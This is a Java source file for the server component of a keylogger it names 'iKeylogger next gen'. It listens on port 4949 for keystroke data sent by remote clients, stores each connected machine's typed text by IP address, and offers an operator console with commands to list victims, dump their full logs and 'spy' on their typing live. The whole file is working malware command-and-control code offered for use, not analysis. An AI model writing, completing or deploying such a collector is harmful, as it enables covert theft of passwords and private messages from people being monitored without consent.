package me.freeze;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.json.JSONObject;

public class Main {
	public static ServerSocket server;
	public static Map<InetAddress, Boolean> CONNECTION_STATUS = new HashMap<InetAddress, Boolean>();
	public static Map<InetAddress, String> CONNECTION_DATA = new HashMap<InetAddress, String>();
	public static Map<InetAddress, Integer> CONNECTION_TIMEOUT = new HashMap<InetAddress, Integer>();
	static InetAddress selectedConnection = null;
	public static void main(String[]args) {
		startServer();
		commandLine();
	}
	
	static void startServer() {

		new Thread() {
			public void run() {
				try {
					server = new ServerSocket(4949);
					System.out.println("[iKeylogger] Server started successfully at port 4949");
					while(true) {
						Socket socket = server.accept();
						InetAddress address = socket.getInetAddress();
						InputStreamReader in = new InputStreamReader(socket.getInputStream());
						BufferedReader b = new BufferedReader(in);
						String response = b.readLine();
						JSONObject object = new JSONObject(response);  
						CONNECTION_STATUS.put(address, true);
						if(object.get("type").equals("connection")) {
							if(!CONNECTION_TIMEOUT.containsKey(address)) {
								new Connection(address).start();
							}
							CONNECTION_TIMEOUT.put(address, 0);
						}
						if(object.get("type").equals("key")) {
							if(!CONNECTION_TIMEOUT.containsKey(address)) {
								new Connection(address).start();
							}
							CONNECTION_TIMEOUT.put(address, 0);
							CONNECTION_DATA.put(address, CONNECTION_DATA.get(address)+object.get("data"));
							if(address.equals(selectedConnection))
							{
								System.out.print(object.get("data"));
							}
						}
					}
					
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		}.start();
	}
	
	static void commandLine() {
		new Thread() {
			public void run() {
				try {
					Thread.sleep(500);
					System.out.println("iKeylogger next gen, version 1.0");
					Thread.sleep(1000);
				} catch (InterruptedException e1) {}
				while(true) {
					try {
						InputStreamReader systeminput = new InputStreamReader(System.in);
						BufferedReader buffer = new BufferedReader(systeminput);
						System.out.print("iKeylogger> ");
						String input;
						input = buffer.readLine();
						String[] args = input.split(" ");
						if(input.equals("help")) {
							System.out.println("Commands:");
							System.out.println("connections - Show all connections");
							System.out.println("log <InetAddress> - Show entire text from this connection");
							System.out.println("spy <InetAddress> - See in live what the client is writing");
							System.out.println("nospy - Close live with client");
							System.out.println("clear - Clears screen");
							System.out.println("exit - Kill server");
						}
						if(input.equals("exit")) {
							System.out.println("Killing server...");
							System.out.println("Bye");
							System.exit(0);
						}
						if(input.equals("clear")) {
							System.out.print("\033[H\033[2J");  
						    System.out.flush();  
						}
						if(input.equals("connections")) {
							if(CONNECTION_STATUS.size() == 0) {
								System.out.println("No connections");
							}else {
								System.out.println("Connections:");
								for(Entry<InetAddress, Boolean> entry : CONNECTION_STATUS.entrySet()) {
									System.out.println("InetAddress: "+entry.getKey().getHostAddress()+ " | Connected: "+entry.getValue());
								}
							}
						}
						if(input.equals("nospy")) {
							if(selectedConnection != null) {
								System.out.println("Closing live with "+selectedConnection.getHostAddress());
							}else {
								System.out.println("Nothing to close");
							}
							selectedConnection = null;
						}
						if(args.length >= 1) {
							if(args[0].equals("log")) {
								try {
								if(CONNECTION_DATA.containsKey(InetAddress.getByName(args[1]))){
									System.out.println(CONNECTION_DATA.get(InetAddress.getByName(args[1])));
								}else {
									System.out.println("Invalid connection");
								}
								}catch(Exception eex) {
									System.out.println("Invalid connection");
								}
							}
							if(args[0].equals("spy")) {
								try {
									selectedConnection = InetAddress.getByName(args[1]);
									for(int i = 0; i < 4; i++) {System.out.println("");}
									System.out.println("Live from "+args[1]);
								}catch(Exception eex) {
									System.out.println("Invalid connection");
								}
							}
						}
					} catch (IOException e) {
						e.printStackTrace();
					}
				
			}
			}
		}.start();
		
	}
	
}
